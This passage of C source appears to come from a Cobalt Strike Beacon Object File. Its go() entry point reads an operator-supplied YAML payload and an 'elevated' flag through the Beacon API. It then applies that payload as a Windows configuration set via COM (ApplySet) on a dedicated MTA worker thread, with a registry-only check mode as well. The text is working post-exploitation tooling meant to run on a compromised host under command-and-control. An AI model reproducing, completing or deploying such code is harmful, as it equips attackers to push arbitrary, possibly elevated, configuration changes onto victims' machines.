    if (FAILED(hr)) goto done;
    vinfo("[*] YAML parsed, applying...\n");

    hr = c.proc->lpVtbl->ApplySet(c.proc, set, 0 /* flags=None */, &apply_insp);
    if (FAILED(hr)) { err("ApplySet: 0x%08X\n", hr); goto done; }

    hr = apply_insp->lpVtbl->QueryInterface(apply_insp,
                                            &IID_IApplyConfigurationSetResult, (void**)&apply_result);
    if (FAILED(hr)) goto done;

    HRESULT overall = S_OK;
    apply_result->lpVtbl->get_ResultCode(apply_result, &overall);

    walk_unit_results(apply_result, &ok_n, &fail_n);

    if (FAILED(overall) || fail_n > 0) {
        err("ApplySet: %d ok / %d fail (rc=0x%08X)\n", ok_n, fail_n, overall);
        hr = FAILED(overall) ? overall : E_FAIL;
    } else {
        ok("[+] ApplySet: %d units applied\n", ok_n);
    }

done:
    SAFE_REL(apply_result);
    SAFE_REL(apply_insp);
    SAFE_REL(set);
    SAFE_REL(input);
    SAFE_REL(keepalive);
    ds_ctx_release(&c);
    return SUCCEEDED(hr) ? 0 : 1;
}

/* ========================================================================= *
 *  Worker-thread dispatch.
 *
 *  Beacon typically runs the BOF on an STA. We always hop to a fresh thread
 *  and take a clean MTA so WinRT async + DCOM don't need a message pump.
 * ========================================================================= */
typedef struct {
    int         mode;
    BOOL        elevated;
    const char *yaml;
    int         yaml_len;
    int         rc;
} ds_worker_args;

static DWORD WINAPI ds_worker(LPVOID p) {
    ds_worker_args *w = (ds_worker_args*)p;
    BOOL inited_com = FALSE, inited_ro = FALSE;
    HRESULT hr;

    hr = OLE32$CoInitializeEx(NULL, DS_COINIT_MULTITHREADED);
    if (hr == S_OK || hr == S_FALSE) {
        inited_com = TRUE;
    } else if (hr == HR_RPC_E_CHANGED_MODE) {
        /* Thread already initialized (shouldn't happen on a fresh thread, but
         * accept it rather than failing). */
        trace("[T] worker: CoInitializeEx returned RPC_E_CHANGED_MODE, continuing\n");
    } else {
        err("CoInitializeEx (worker): 0x%08X\n", hr);
        w->rc = 1;
        return 0;
    }

    hr = COMBASE$RoInitialize(DS_RO_INIT_MULTITHREADED);
    if (hr == S_OK || hr == S_FALSE) inited_ro = TRUE;
    else if (hr == HR_RPC_E_CHANGED_MODE) trace("[T] worker: RoInitialize RPC_E_CHANGED_MODE\n");

    if (w->mode == 1) {
        w->rc = run_check(w->elevated);
    } else {
        w->rc = run_apply(w->yaml, w->yaml_len, w->elevated);
    }

    if (inited_ro)  COMBASE$RoUninitialize();
    if (inited_com) OLE32$CoUninitialize();
    return 0;
}

/* ========================================================================= *
 *  BOF entry
 * ========================================================================= */
void go(char *args, int alen) {
    datap parser;

    BeaconDataParse(&parser, args, alen);
    int   mode  = BeaconDataInt(&parser);
    int   flags = BeaconDataInt(&parser);
    int   ylen  = 0;
    char *yaml  = BeaconDataExtract(&parser, &ylen);

    g_verbose = (flags & DS_FLAG_VERBOSE) != 0;
    BOOL elevated = (flags & DS_FLAG_ELEVATED) != 0;

    trace("[T] go: mode=%d flags=0x%X ylen=%d\n", mode, flags, ylen);

    if (mode != 1 && (!yaml || ylen <= 0)) {
        err("missing YAML payload\n");
        return;
    }

    /* Check mode can run on the beacon thread directly - it's all registry
     * reads, no DCOM, so no apartment concerns. Cheaper and still safe. */
    if (mode == 1) {
        run_check(elevated);
        return;
    }

    ds_worker_args w;
    w.mode     = mode;
    w.elevated = elevated;
    w.yaml     = yaml;
    w.yaml_len = ylen;
    w.rc       = 0;

    HANDLE h = KERNEL32$CreateThread(NULL, 0, ds_worker, &w, 0, NULL);
    if (!h) {
        err("CreateThread failed\n");
        return;
    }
    /* Block: the BOF image is unmapped when go() returns. */
    KERNEL32$WaitForSingleObject(h, INFINITE);
    KERNEL32$CloseHandle(h);
}